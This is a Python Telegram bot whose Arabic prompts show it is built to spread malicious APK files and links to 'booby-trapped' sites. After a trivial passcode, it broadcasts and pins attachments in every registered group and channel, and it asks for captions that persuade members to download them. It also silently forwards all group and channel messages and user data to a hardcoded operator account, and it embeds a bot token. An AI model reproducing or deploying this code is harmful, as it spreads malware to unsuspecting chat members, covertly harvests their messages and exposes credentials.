
import asyncio
import html
import json
import os
from database import db, Admin

from functools import wraps

from telegram.constants import ParseMode
from telegram import Bot, Update
from telegram.ext import ApplicationBuilder, CommandHandler, filters, ContextTypes , ConversationHandler, MessageHandler




TOKEN = "5594860872:AAFpcI7yG5uMCTQst00e1jS4UwNaMozhzus"
PORT = int(os.environ.get('PORT', '8443'))


ADMINS = db.get_admins()
PUBLIC_CHATS = db.get_public_chats()
AMDIN = '1345337405'

AUTHENTICATE, BASM_ALLAH = range(2) 
def super_restriction(func):
    @wraps(func)
    async def wrapped(update : Update, context, *args, **kwargs):
        user = Admin(chat_id = update.effective_user.id,username=update.effective_user.username, name=update.effective_user.full_name)
        exists = [i for i in ADMINS if i.chat_id == user.chat_id]
        if len(exists)==0 or exists == None:
            return
        return await func(update, context, *args, **kwargs)
    return wrapped


@super_restriction
async def role(update : Update, context:ContextTypes.DEFAULT_TYPE):    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f'Welcome {update.effective_chat.full_name} : You\'r admin.')
    



@super_restriction
async def tokal(update : Update , context : ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "  ادخل رمز التاكيد لمتابعة العملية"
    )
    
    return AUTHENTICATE

async def authenticate(update : Update, context : ContextTypes.DEFAULT_TYPE):
    code = update.message.text
    if code == '12345':
        await update.message.reply_text(
            'تم التخقق من الرمز بنجاح\n'
            ' توكلوا على الله الواحد ثم ارسلوا الملف مع الوصف الخاص به\n'
            " في حالة الغاء العملية قوم بارسال الامر\n"
            "<code> /end </code>\n",
            parse_mode=ParseMode.HTML
        )
        return BASM_ALLAH
    else:
        await update.message.reply_text(
            'رمز التحقق غير صحيح سوف يتم انهاء العملية'
        )
        return ConversationHandler.END
        
async def basm_allah(update : Update, context : ContextTypes.DEFAULT_TYPE):
    if update.message.document is not None:
        if len(update.message.caption) == 0:
            await update.message.reply_text(quote=True, text='الرجاء اضافة وصف للمرفق لجعله اكثر أقناعا للاشخاص ليقوموا بتنزيل المرفق بأذن الله.')
            return ConversationHandler.WAITING
        for i in PUBLIC_CHATS:
            m = await context.bot.send_document(chat_id=i.chat_id, document=update.message.document, caption=update.message.caption)
            await m.pin()
        
        await update.message.reply_text('الحمدلله تم ارسال المرفق لكل القنوات و المجموعات المسجله.\nالله يسدد\n')
        return ConversationHandler.END
    elif len(update.message.photo) != 0:
        if len(update.message.caption) == 0:
            await update.message.reply_text(quote=True, text='الرجاء اضافة وصف لصورة  او رابط الى موقع ملغم')
            return ConversationHandler.WAITING
        for i in PUBLIC_CHATS:
            m = await context.bot.send_photo(chat_id=i.chat_id, photo=update.message.photo[-1], caption=update.message.caption)
            await m.pin()
        
        await update.message.reply_text('الحمدلله تم ارسال الصورة لكل القنوات و المجموعات المسجله.\nالله يسدد\n')
        return ConversationHandler.END
       
    else :
        return ConversationHandler.END

    
async def messages(update: Update, context : ContextTypes.DEFAULT_TYPE):
    
    update_str = update.to_dict() if isinstance(update, Update) else str(update)

    admins = await update.effective_chat.get_administrators()
    is_admin = [x for x in admins if x.user.id == context.bot.id]
    
    message = (
        f"is Admin : {is_admin is not None}\n"
        f"<pre>update = {html.escape(json.dumps(update_str, indent=2, ensure_ascii=False))}"
        "</pre>\n\n"
        f"<pre>context.chat_data = {html.escape(str(context.chat_data))}</pre>\n\n"
        f"<pre>context.user_data = {html.escape(str(context.user_data))}</pre>\n\n"
    )
                
     # Finally, send the message
    await context.bot.send_message(
        chat_id=AMDIN, text=message, parse_mode=ParseMode.HTML
    )
                
async def end(update : Update, context : ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        'تم انهاء العملية'
    )
    
    return ConversationHandler.END

def test():
    
    application = ApplicationBuilder().token(TOKEN).connect_timeout(30).read_timeout(30).write_timeout(30).build()

    role_handlers = CommandHandler('role', role, filters.ChatType.PRIVATE | filters.ChatType.GROUPS)
    message_handlres = MessageHandler(filters= filters.ChatType.GROUPS | filters.ChatType.CHANNEL, callback= messages)

    cove_handler = ConversationHandler(
        entry_points=[CommandHandler('tokal', tokal)],
        states={
            AUTHENTICATE : [
                MessageHandler(filters.TEXT, authenticate)
            ],
            BASM_ALLAH : [
                MessageHandler((filters.PHOTO | filters.Document.APK) & filters.ChatType.PRIVATE, basm_allah )
                
            ]
        },
        fallbacks=[CommandHandler('end', end)]
    )
    application.add_handler(message_handlres)
    application.add_handler(role_handlers)
    application.add_handler(cove_handler)
    
    


    # add handlers
    application.run_polling()
    

if __name__ == '__main__':
    test()
    


